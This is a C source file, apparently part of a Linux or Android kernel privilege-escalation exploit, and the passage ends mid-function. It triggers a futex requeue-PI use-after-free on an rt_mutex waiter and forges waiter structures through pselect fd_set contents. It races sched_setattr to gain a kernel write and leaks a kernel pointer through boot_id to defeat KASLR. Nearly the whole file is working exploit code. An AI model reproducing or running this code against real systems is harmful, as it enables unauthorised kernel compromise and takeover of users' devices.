#include "common.h"

#ifndef SLIDE_MAX_ATTEMPTS
#define SLIDE_MAX_ATTEMPTS 20
#endif
#define SLIDE_PSELECT_PAD_BYTES 0
#ifndef SLIDE_PSELECT_WORD_SHIFT
#define SLIDE_PSELECT_WORD_SHIFT 0
#endif
#define SLIDE_WAIT_NSEC 50000000L
#define SLIDE_REQUEUE_MAX_POLLS 1000
#define SLIDE_REQUEUE_POLL_USEC 1000

#if defined(SLIDE_P0_OFFSET_CANDIDATES) && \
    (!defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE)
static const uintptr_t slide_p0_offsets[] = {
  SLIDE_P0_OFFSET_CANDIDATES
};
#endif

static uint32_t slide_f_wait;
static uint32_t slide_f_pi_target;
static uint32_t slide_f_pi_chain;
static atomic_int slide_waiter_ready;
static atomic_int slide_waiter_waiting;
static atomic_int slide_owner_started;
static atomic_int slide_owner_acquired;
static atomic_int slide_deadlock_seen;
static atomic_int slide_waiter_ok;
static atomic_int slide_route_done;
static atomic_int slide_waiter_tid;
static atomic_int slide_consume_calls;
static atomic_int slide_consume_go;
static atomic_int slide_consume_seen;
static atomic_int slide_consume_lost;
static atomic_int slide_consume_enter_sched;
static atomic_int slide_consume_stop;
static atomic_int slide_consume_sched_ok;
static atomic_int slide_consume_last_sched_ret;
static atomic_int slide_consume_last_sched_errno;
static atomic_int slide_consumer_ready;
static atomic_int slide_pselect_write_window;
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
static atomic_uint_fast64_t slide_pselect_started_ns;
static int slide_pselect_production_stack;
#endif
static int slide_pselect_nfds = PSELECT_ROUTE_NFDS;
static int slide_syscall_pad;
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
int slide_p0_session_fresh;
#endif
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
int p0_virtual_base_probe;
#endif

static int slide_commit_stext(uint64_t stext, const char *source);

#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
static int slide_commit_virtual_base(uint64_t base, const char *source) {
  if ((base >> 48) != 0xffff || (base & 0x1fffffULL) != 0 ||
      base < KIMAGE_VIRTUAL_BASE_MIN || base > KIMAGE_VIRTUAL_BASE_MAX ||
      base > UINT64_MAX - ASHMEM_FOPS_OFF) {
    pr_warning("virtual base rejected source=%s base=%016llx\n",
               source, (unsigned long long)base);
    return 0;
  }
  kaslr_base = base;
  kaslr_slide = base - KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  app_publish_p0_offset(slide_p0_offset);
  pr_success("slide-kaslr-ok source=%s pid=%d base=%016llx "
             "virtual_slide=%016llx p0_offset=%08zx\n",
             source, getpid(), (unsigned long long)kaslr_base,
             (unsigned long long)kaslr_slide, slide_p0_offset);
  return 1;
}
#endif

static useconds_t slide_enter_delay_usec(void) {
  const char *forced = getenv("SLIDE_ENTER_DELAY_USEC");
  if (!forced || !*forced) {
    forced = getenv("PSELECT_DELAY_USEC");
  }
  if (forced && *forced) {
    char *end = NULL;
    errno = 0;
    long value = strtol(forced, &end, 0);
    if (!errno && end != forced && !*end && value >= 0 && value <= 1000000) {
      return (useconds_t)value;
    }
  }
  return PSELECT_ENTER_DELAY_USEC;
}

static uint64_t slide_fdset_get_word(const fd_set *set, int word) {
  uint64_t value = 0;
  memcpy(&value, (const unsigned char *)set + word * sizeof(value),
         sizeof(value));
  return value;
}

static void slide_log_child_context(void) {
  char attr[256];
  char enforce[32];
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  pr_success("slide child context route=pselect pid=%d uid=%u euid=%u "
             "gid=%u egid=%u attr=%s enforce=%s\n",
             getpid(), getuid(), geteuid(), getgid(), getegid(), attr,
             enforce);
}

int slide_pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (slide_pselect_nfds + bits_per_word - 1) / bits_per_word;
}

int slide_pselect_global_word(int waiter_word) {
  return SLIDE_PSELECT_WORD_SHIFT + waiter_word;
}

int slide_pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

uint64_t slide_pselect_get_global_word(
    const fd_set *in, const fd_set *out, const fd_set *ex,
    int words_per_set, int global_word) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      return slide_fdset_get_word(in, word_idx);
    case 1:
      return slide_fdset_get_word(out, word_idx);
    case 2:
      return slide_fdset_get_word(ex, word_idx);
    default:
      return 0;
  }
}

void slide_pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, uint64_t value, const char *name) {
  int global_word = slide_pselect_global_word(waiter_word);
  int placed = slide_pselect_put_global_word(
      in, out, ex, words_per_set, global_word, value);
  if (!placed) {
    pr_warning("slide pselect cannot place %s waiter_word=%d global_word=%d "
               "words_per_set=%d nfds=%d\n",
               name, waiter_word, global_word, words_per_set,
               slide_pselect_nfds);
  }
}

void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  int words_per_set = slide_pselect_words_per_set();
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
  uintptr_t stack_tree_parent = slide_oracle_parent;
  uintptr_t stack_tree_right = 0;
  uintptr_t stack_tree_left = slide_oracle_target;
  uintptr_t stack_pi_parent = slide_oracle_parent;
  uintptr_t stack_pi_right = 0;
  uintptr_t stack_pi_left = slide_oracle_target;
  uintptr_t stack_task = fake_task;
  slide_pselect_production_stack = 0;
#if defined(APP_PRODUCTION_STACK_PI_RIGHT_ONLY) && \
    APP_PRODUCTION_STACK_PI_RIGHT_ONLY
  if (slide_oracle_parent == fake_fops &&
      slide_oracle_target == data_addr(ASHMEM_MISC_FOPS)) {
    /*
     * The stale pselect waiter is dequeued from the lock waiter tree before
     * the PI-tree requeue.  Keep its proven oracle tree and fake-task fields;
     * build 58 cleared the tree child and consequently produced no write.
     * Isolate only the established FOPS PI-child direction here.
     */
    stack_pi_right = data_addr(ASHMEM_MISC_FOPS);
    stack_pi_left = 0;
    slide_pselect_production_stack = 1;
  }
#endif
#else
  slide_pselect_production_stack = 0;
#endif
#endif
  struct slide_waiter_word {
    int word;
    uint64_t value;
    const char *name;
  } words[] = {
#if LEGACY_RT_MUTEX_WAITER || COMPACT_RT_MUTEX_WAITER
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
    {0, stack_tree_parent, "tree_pc"},
    {1, stack_tree_right, "tree_right"},
    {2, stack_tree_left, "tree_left"},
    {3, stack_pi_parent, "pi_pc"},
    {4, stack_pi_right, "pi_right"},
    {5, stack_pi_left, "pi_left"},
#else
    {0, slide_oracle_parent, "tree_pc"},
    {1, 0, "tree_right"},
    {2, slide_oracle_target, "tree_left"},
    {3, slide_oracle_parent, "pi_pc"},
    {4, 0, "pi_right"},
    {5, slide_oracle_target, "pi_left"},
#endif
#else
    {0, SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset, "tree_pc"},
    {1, 0, "tree_right"},
    {2, SLIDE_WAITER_TREE_LEFT + slide_p0_offset, "tree_left"},
    {3, SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset, "pi_pc"},
    {4, 0, "pi_right"},
    {5, SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset, "pi_left"},
#endif
#if defined(SLIDE_USE_FAKE_TASK) && SLIDE_USE_FAKE_TASK
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION && \
    defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
    {6, stack_task, "task"},
#else
    {6, fake_task, "task"},
#endif
#else
    {6, SLIDE_WAITER_TASK + slide_p0_offset, "task"},
#endif
    {7, fake_lock, "lock"},
#if COMPACT_RT_MUTEX_WAITER
    {8, ((uint64_t)(uint32_t)FAKE_WAITER_PRIO << 32) |
            (uint32_t)SLIDE_WAITER_WAKE_STATE,
     "wake_state+prio"},
#else
    {8, FAKE_WAITER_PRIO, "prio"},
#endif
    {9, 0, "deadline"},
#if COMPACT_RT_MUTEX_WAITER
    {10, 0, "ww_ctx"},
#endif
#else
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
    {0, slide_oracle_parent, "tree_pc"},
    {1, 0, "tree_right"},
    {2, slide_oracle_target, "tree_left"},
    {3, FAKE_WAITER_PRIO, "tree_prio"},
    {5, slide_oracle_parent, "pi0"},
    {6, 0, "pi1"},
    {7, slide_oracle_target, "pi2"},
#else
    {0, SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset, "tree_pc"},
    {1, 0, "tree_right"},
    {2, SLIDE_WAITER_TREE_LEFT + slide_p0_offset, "tree_left"},
    {3, FAKE_WAITER_PRIO, "tree_prio"},
    {5, SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset, "pi0"},
    {6, 0, "pi1"},
    {7, SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset, "pi2"},
#endif
    {8, FAKE_WAITER_PRIO, "pi_prio"},
    {9, 0, "pi_deadline"},
#if defined(SLIDE_USE_FAKE_TASK) && SLIDE_USE_FAKE_TASK
    {10, fake_task, "task"},
#else
    {10, SLIDE_WAITER_TASK + slide_p0_offset, "task"},
#endif
    {11, fake_lock, "lock"},
#if defined(SLIDE_USE_FAKE_TASK) && SLIDE_USE_FAKE_TASK
    {12, 0, "wake_state"},
#else
    {12, SLIDE_WAITER_WAKE_STATE, "wake_state"},
#endif
    {13, 0, "ww_ctx"},
#endif
  };
  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
    struct slide_waiter_word *w = &words[i];
    slide_pselect_put_waiter_word(
        in, out, ex, words_per_set, w->word, w->value, w->name);
  }
}

void open_slide_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
  for (int fd = 0; fd < slide_pselect_nfds; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(read_fd, fd);
    }
  }
}

void slide_pselect_stack_copy(void) {
  if (!page_base || !fake_lock || !fake_w0) {
    pr_error("slide pselect missing kernel page base=%016zx lock=%016zx w0=%016zx\n",
             page_base, fake_lock, fake_w0);
    return;
  }

  int pipefd[2] = {-1, -1};
  SYSCHK(pipe(pipefd));
  int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
  if (block_fd < 0) {
    pr_warning("slide timerfd_create failed errno=%d; using pipe read end\n",
               errno);
    block_fd = pipefd[0];
  }
  int high_read = fcntl(block_fd, F_DUPFD, slide_pselect_nfds + 16);
  if (high_read < 0) {
    pr_error("slide pselect F_DUPFD read errno=%d\n", errno);
    if (block_fd != pipefd[0]) {
      close(block_fd);
    }
    close(pipefd[0]);
    close(pipefd[1]);
    return;
  }

  fd_set in;
  fd_set out;
  fd_set ex;
  prepare_slide_pselect_fdsets(&in, &out, &ex);
  open_slide_selected_fds(&in, &out, &ex, high_read);

  atomic_store(&slide_consume_stop, 0);
  atomic_store(&slide_consume_go, 0);
  atomic_store(&slide_consume_seen, 0);
  atomic_store(&slide_consume_lost, 0);
  atomic_store(&slide_consume_enter_sched, 0);
  atomic_store(&slide_consume_calls, 0);
  atomic_store(&slide_consume_sched_ok, 0);
  atomic_store(&slide_consume_last_sched_ret, -1);
  atomic_store(&slide_consume_last_sched_errno, 0);
  atomic_store(&slide_pselect_write_window, 0);
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  atomic_store(&slide_pselect_started_ns, 0);
#endif

  struct timespec timeout = {
#ifdef SLIDE_PSELECT_TIMEOUT_NSEC
    .tv_sec = 0,
    .tv_nsec = SLIDE_PSELECT_TIMEOUT_NSEC,
#else
    .tv_sec = PSELECT_TIMEOUT_SEC,
    .tv_nsec = 0,
#endif
  };
  struct timespec *timeoutp = &timeout;

  size_t pselect_started = gettime_ns();
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  atomic_store(&slide_pselect_started_ns, pselect_started);
#endif
  for (int index = 0; index < slide_syscall_pad; index++) {
    syscall(SYS_gettid);
  }
  atomic_store(&slide_consume_go, 1);
  errno = 0;
  int ret = (int)syscall(SYS_pselect6, slide_pselect_nfds,
                         &in, &out, &ex, timeoutp, NULL);
  int saved_errno = errno;
  size_t pselect_elapsed_usec =
      (gettime_ns() - pselect_started) / 1000ULL;
  atomic_store(&slide_consume_go, 0);

  if (atomic_load(&slide_consume_enter_sched) != 0 &&
      !atomic_load(&slide_consume_stop)) {
    size_t consume_deadline = gettime_ns() + 200000000ULL;
    while (!atomic_load(&slide_consume_stop) &&
           gettime_ns() < consume_deadline) {
      usleep(1000);
    }
  }

#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  pr_info("slide pselect returned nfds=%d pad=%d prod_stack=%d "
          "ret=%d errno=%d "
          "elapsed_usec=%zu "
          "ready=%d seen=%d entered=%d calls=%d sched_ok=%d "
          "last_sched_ret=%d last_sched_errno=%d\n",
          slide_pselect_nfds, slide_syscall_pad,
          slide_pselect_production_stack, ret, saved_errno,
          pselect_elapsed_usec,
          atomic_load(&slide_consumer_ready),
          atomic_load(&slide_consume_seen),
          atomic_load(&slide_consume_enter_sched),
          atomic_load(&slide_consume_calls),
          atomic_load(&slide_consume_sched_ok),
          atomic_load(&slide_consume_last_sched_ret),
          atomic_load(&slide_consume_last_sched_errno));
#else
  pr_info("slide pselect returned nfds=%d pad=%d ret=%d errno=%d "
          "elapsed_usec=%zu "
          "ready=%d seen=%d entered=%d calls=%d sched_ok=%d "
          "last_sched_ret=%d last_sched_errno=%d\n",
          slide_pselect_nfds, slide_syscall_pad, ret, saved_errno,
          pselect_elapsed_usec,
          atomic_load(&slide_consumer_ready),
          atomic_load(&slide_consume_seen),
          atomic_load(&slide_consume_enter_sched),
          atomic_load(&slide_consume_calls),
          atomic_load(&slide_consume_sched_ok),
          atomic_load(&slide_consume_last_sched_ret),
          atomic_load(&slide_consume_last_sched_errno));
#endif
  atomic_store(&slide_pselect_write_window,
               ret > 0 && atomic_load(&slide_consume_sched_ok) > 0);

  close(high_read);
  if (block_fd != pipefd[0]) {
    close(block_fd);
  }
  close(pipefd[0]);
  close(pipefd[1]);
}

#if defined(SLIDE_SYNC_PSELECT_SYSCALL) && SLIDE_SYNC_PSELECT_SYSCALL
static long slide_read_task_syscall_nr(int tid) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/self/task/%d/syscall", tid);
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return -1;
  }
  char buf[128];
  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  close(fd);
  if (n <= 0) {
    return -1;
  }
  buf[n] = 0;
  char *end = NULL;
  errno = 0;
  long nr = strtol(buf, &end, 0);
  if (errno || end == buf) {
    return -1;
  }
  return nr;
}

static int slide_read_task_wchan(int tid, char *buf, size_t size) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/self/task/%d/wchan", tid);
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  ssize_t n = read(fd, buf, size - 1);
  close(fd);
  if (n <= 0) {
    return 0;
  }
  buf[n] = 0;
  char *newline = strchr(buf, '\n');
  if (newline) {
    *newline = 0;
  }
  return 1;
}

static int slide_task_blocked_in_pselect(int tid, char *wchan, size_t size) {
  if (slide_read_task_syscall_nr(tid) != SYS_pselect6 ||
      !slide_read_task_wchan(tid, wchan, size)) {
    return 0;
  }
  return strncmp(wchan, "do_select", strlen("do_select")) == 0;
}

static int slide_wait_for_pselect_blocked(int tid, size_t timeout_usec,
                                          int confirmations,
                                          size_t *elapsed_usec,
                                          char *last_wchan,
                                          size_t last_wchan_size) {
  size_t started = gettime_ns();
  size_t deadline = started + timeout_usec * 1000ULL;
  int synced = 0;
  while (gettime_ns() < deadline) {
    if (slide_task_blocked_in_pselect(tid, last_wchan,
                                      last_wchan_size)) {
      synced++;
      if (synced >= confirmations) {
        break;
      }
      usleep(100);
    } else {
      synced = 0;
      __asm__ volatile("yield" ::: "memory");
    }
  }
  if (elapsed_usec) {
    *elapsed_usec = (gettime_ns() - started) / 1000ULL;
  }
  return synced >= confirmations;
}
#endif

void *slide_consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);
  atomic_store(&slide_consumer_ready, 1);
  int *errno_ptr = &errno;

  int seen = 0;
  for (;;) {
    int seq = atomic_load(&slide_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      if (atomic_load(&slide_consume_stop)) {
        return NULL;
      }
      continue;
    }

    seen = seq;
    atomic_store(&slide_consume_seen, seen);
    if (atomic_load(&slide_consume_go) != seq) {
      int lost = atomic_load(&slide_consume_lost) + 1;
      atomic_store(&slide_consume_lost, lost);
      continue;
    }

#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
    int tid = atomic_load(&slide_waiter_tid);
#if defined(SLIDE_SYNC_PSELECT_SYSCALL) && SLIDE_SYNC_PSELECT_SYSCALL
    int ready_ok = -1;
    int guard_ok = -1;
    size_t ready_elapsed_usec = 0;
    size_t guard_elapsed_usec = 0;
    uint64_t pselect_age_usec = 0;
    char ready_wchan[64] = "<not-read>";
    char guard_wchan[64] = "<not-read>";
#endif
    if (seq == 1) {
#if defined(SLIDE_SYNC_PSELECT_SYSCALL) && SLIDE_SYNC_PSELECT_SYSCALL
      ready_ok = slide_wait_for_pselect_blocked(
          tid, SLIDE_PSELECT_READY_TIMEOUT_USEC,
          SLIDE_PSELECT_WCHAN_CONFIRMATIONS, &ready_elapsed_usec,
          ready_wchan, sizeof(ready_wchan));
      if (!ready_ok) {
        pr_info("slide pselect ready=0 tid=%d elapsed_usec=%zu wchan=%s; "
                "trigger skipped\n",
                tid, ready_elapsed_usec, ready_wchan);
        atomic_store(&slide_consume_stop, 1);
        return NULL;
      }
#endif
      usleep(slide_enter_delay_usec());
#if defined(APP_PSELECT_TRIGGER_MAX_AGE_USEC)
      uint64_t pselect_started_ns = atomic_load(&slide_pselect_started_ns);
      pselect_age_usec = pselect_started_ns
          ? (gettime_ns() - pselect_started_ns) / 1000ULL
          : UINT64_MAX;
      if (pselect_age_usec > APP_PSELECT_TRIGGER_MAX_AGE_USEC) {
        pr_info("slide pselect age guard=0 tid=%d age_usec=%llu max=%d; "
                "trigger skipped\n",
                tid, (unsigned long long)pselect_age_usec,
                APP_PSELECT_TRIGGER_MAX_AGE_USEC);
        atomic_store(&slide_consume_stop, 1);
        return NULL;
      }
#endif
#if defined(SLIDE_GUARD_PSELECT_SYSCALL) && SLIDE_GUARD_PSELECT_SYSCALL
      guard_ok = slide_wait_for_pselect_blocked(
          tid, SLIDE_PSELECT_RECHECK_TIMEOUT_USEC,
          SLIDE_PSELECT_WCHAN_CONFIRMATIONS, &guard_elapsed_usec,
          guard_wchan, sizeof(guard_wchan));
      if (!guard_ok) {
        pr_info("slide pselect blocked guard=0 tid=%d elapsed_usec=%zu "
                "wchan=%s; trigger skipped\n",
                tid, guard_elapsed_usec, guard_wchan);
        atomic_store(&slide_consume_stop, 1);
        return NULL;
      }
#endif
#if defined(APP_PSELECT_POST_GUARD_AGE_CHECK) && \
    APP_PSELECT_POST_GUARD_AGE_CHECK && \
    defined(APP_PSELECT_TRIGGER_MAX_AGE_USEC)
      pselect_started_ns = atomic_load(&slide_pselect_started_ns);
      pselect_age_usec = pselect_started_ns
          ? (gettime_ns() - pselect_started_ns) / 1000ULL
          : UINT64_MAX;
      if (pselect_age_usec > APP_PSELECT_TRIGGER_MAX_AGE_USEC) {
        pr_info("slide pselect post-guard age=0 tid=%d age_usec=%llu "
                "max=%d; trigger skipped\n",
                tid, (unsigned long long)pselect_age_usec,
                APP_PSELECT_TRIGGER_MAX_AGE_USEC);
        atomic_store(&slide_consume_stop, 1);
        return NULL;
      }
#endif
    }
#else
    if (seq == 1) {
      usleep(slide_enter_delay_usec());
    }
    int tid = atomic_load(&slide_waiter_tid);
#endif

    int calls = atomic_load(&slide_consume_calls);
    int entered = atomic_load(&slide_consume_enter_sched) + 1;
    atomic_store(&slide_consume_enter_sched, entered);
    atomic_store(&slide_consume_calls, calls + 1);
    *errno_ptr = 0;
    long ret = sched_setattr_tid(tid, (calls % 19) + 1);
    int saved_errno = *errno_ptr;
#if defined(SLIDE_SYNC_PSELECT_SYSCALL) && SLIDE_SYNC_PSELECT_SYSCALL
    pr_info("slide pselect blocked ready=%d ready_usec=%zu ready_wchan=%s "
            "guard=%d guard_usec=%zu guard_wchan=%s age_usec=%llu tid=%d\n",
            ready_ok, ready_elapsed_usec, ready_wchan,
            guard_ok, guard_elapsed_usec, guard_wchan,
            (unsigned long long)pselect_age_usec, tid);
#endif
    atomic_store(&slide_consume_last_sched_ret, (int)ret);
    atomic_store(&slide_consume_last_sched_errno, saved_errno);
    if (ret == 0) {
      int sched_ok = atomic_load(&slide_consume_sched_ok) + 1;
      atomic_store(&slide_consume_sched_ok, sched_ok);
    }
    atomic_store(&slide_consume_stop, 1);
    while (atomic_load(&slide_consume_go)) {
      __asm__ volatile("yield" ::: "memory");
    }
    return NULL;
  }
}

void *slide_waiter_thread(void *arg __attribute__((unused))) {
  int tid = (int)SYSCHK(syscall(SYS_gettid));
  atomic_store(&slide_waiter_tid, tid);

  if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide waiter lock chain errno=%d\n", errno);
    return NULL;
  }

  atomic_store(&slide_waiter_ready, 1);
  while (!atomic_load(&slide_owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_nsec += SLIDE_WAIT_NSEC;
  if (timeout.tv_nsec >= 1000000000L) {
    timeout.tv_sec++;
    timeout.tv_nsec -= 1000000000L;
  }

  atomic_store(&slide_waiter_waiting, 1);
  errno = 0;
  long wait_ret = futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
                           &slide_f_pi_target, 0);
  int wait_errno = errno;
  pr_info("slide wait_requeue_pi ret=%ld errno=%d\n", wait_ret, wait_errno);
  if (wait_ret != -1 || wait_errno != ETIMEDOUT) {
    atomic_store(&slide_route_done, 1);
    return NULL;
  }
  atomic_store(&slide_waiter_ok, 1);
  while (!atomic_load(&slide_deadlock_seen)) {
    __asm__ volatile("yield" ::: "memory");
  }
  if (futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide waiter unlock chain errno=%d\n", errno);
    atomic_store(&slide_route_done, 1);
    return NULL;
  }
  while (!atomic_load(&slide_owner_acquired)) {
    __asm__ volatile("yield" ::: "memory");
  }

  slide_pselect_stack_copy();
  atomic_store(&slide_route_done, 1);

  for (;;) {
    sleep(1);
  }
}

void *slide_owner_thread(void *arg __attribute__((unused))) {
  if (futex_op(&slide_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide owner lock target errno=%d\n", errno);
    return NULL;
  }

  while (!atomic_load(&slide_waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&slide_owner_started, 1);
  if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide owner lock chain errno=%d\n", errno);
    return NULL;
  }
  atomic_store(&slide_owner_acquired, 1);

  for (;;) {
    sleep(1);
  }
}

int hex_value(char c) {
  if (c >= '0' && c <= '9') {
    return c - '0';
  }
  if (c >= 'a' && c <= 'f') {
    return c - 'a' + 10;
  }
  if (c >= 'A' && c <= 'F') {
    return c - 'A' + 10;
  }
  return -1;
}

uint64_t slide_read_stext(void) {
  char buf[64];
  unsigned char raw[16];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("slide boot_id read denied errno=%d\n", errno);
    return 0;
  }

  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  int saved_errno = errno;
  close(fd);
  if (n < 0) {
    pr_warning("slide boot_id read failed errno=%d\n", saved_errno);
    return 0;
  }
  buf[n] = 0;

  int nibble = -1;
  int out = 0;
  for (ssize_t i = 0; i < n && out < 16; i++) {
    int v = hex_value(buf[i]);
    if (v < 0) {
      continue;
    }
    if (nibble < 0) {
      nibble = v;
      continue;
    }
    raw[out++] = (unsigned char)((nibble << 4) | v);
    nibble = -1;
  }
  if (out != 16) {
    pr_warning("slide short boot_id parse out=%d n=%zd\n", out, n);
    return 0;
  }

  uint64_t leaked = 0;
  for (int i = 0; i < 8; i++) {
    leaked |= (uint64_t)raw[i] << (i * 8);
  }
  if ((leaked >> 48) != 0xffff) {
    pr_warning("slide bad leaked pointer=%016llx\n",
               (unsigned long long)leaked);
    return 0;
  }

  uint64_t off = p0_alias_image_offset(SLIDE_NFULNL_LOGGER_NAME);
  uint64_t stext = leaked - off;
  pr_success("slide boot_id_leaked_nfulnl_logger pid=%d value=%016llx stext=%016llx\n",
             getpid(), (unsigned long long)leaked, (unsigned long long)stext);
  pr_success("slide boot_id-derived_stext pid=%d value=%016llx\n",
             getpid(), (unsigned long long)stext);
  return stext;
}
uint64_t slide_child_leak_stext(void) {
  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));

  while (!atomic_load(&slide_waiter_waiting) ||
         !atomic_load(&slide_owner_started) ||
         !atomic_load(&slide_consumer_ready)) {
    usleep(1000);
  }

  long requeue_ret = 0;
  int requeue_errno = 0;
  int requeue_polls = 0;
  while (requeue_polls < SLIDE_REQUEUE_MAX_POLLS) {
    requeue_polls++;
    errno = 0;
    requeue_ret = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
                           &slide_f_pi_target, 0);
    requeue_errno = errno;
    if (requeue_ret != 0) {
      break;
    }
    if (requeue_polls < SLIDE_REQUEUE_MAX_POLLS) {
      usleep(SLIDE_REQUEUE_POLL_USEC);
    }
  }
  pr_info("slide cmp_requeue_pi ret=%ld errno=%d polls=%d\n",
          requeue_ret, requeue_errno, requeue_polls);
  if (requeue_ret != -1 || requeue_errno != EDEADLK) {
    return 0;
  }
  atomic_store(&slide_deadlock_seen, 1);

  while (!atomic_load(&slide_route_done)) {
    usleep(1000);
  }
  if (!atomic_load(&slide_waiter_ok)) {
    return 0;
  }

  return slide_read_stext();
}

#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
static int slide_child_trigger_write(void) {
  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));

  while (!atomic_load(&slide_waiter_waiting) ||
         !atomic_load(&slide_owner_started) ||
         !atomic_load(&slide_consumer_ready)) {
    usleep(1000);
  }

  long requeue_ret = 0;
  int requeue_errno = 0;
  int requeue_polls = 0;
  while (requeue_polls < SLIDE_REQUEUE_MAX_POLLS) {
    requeue_polls++;
    errno = 0;
    requeue_ret = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
                           &slide_f_pi_target, 0);
    requeue_errno = errno;
    if (requeue_ret != 0) {
      break;
    }
    if (requeue_polls < SLIDE_REQUEUE_MAX_POLLS) {
      usleep(SLIDE_REQUEUE_POLL_USEC);
    }
  }
  if (requeue_ret != -1 || requeue_errno != EDEADLK) {
    return 0;
  }
  atomic_store(&slide_deadlock_seen, 1);
  while (!atomic_load(&slide_route_done)) {
    usleep(1000);
  }
#if defined(APP_ACCEPT_SCHED_TRIGGER) && APP_ACCEPT_SCHED_TRIGGER
  int sched_ok = atomic_load(&slide_consume_sched_ok) != 0;
  int write_window = atomic_load(&slide_pselect_write_window) != 0;
  pr_info("slide downstream verification armed sched_ok=%d write_window=%d\n",
          sched_ok, write_window);
  return atomic_load(&slide_waiter_ok) != 0 && sched_ok;
#else
  return atomic_load(&slide_waiter_ok) != 0 &&
         atomic_load(&slide_pselect_write_window) != 0;
#endif
}

static int slide_trigger_physical_state(void) {
  pid_t child = SYSCHK(fork());
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(1);
    }
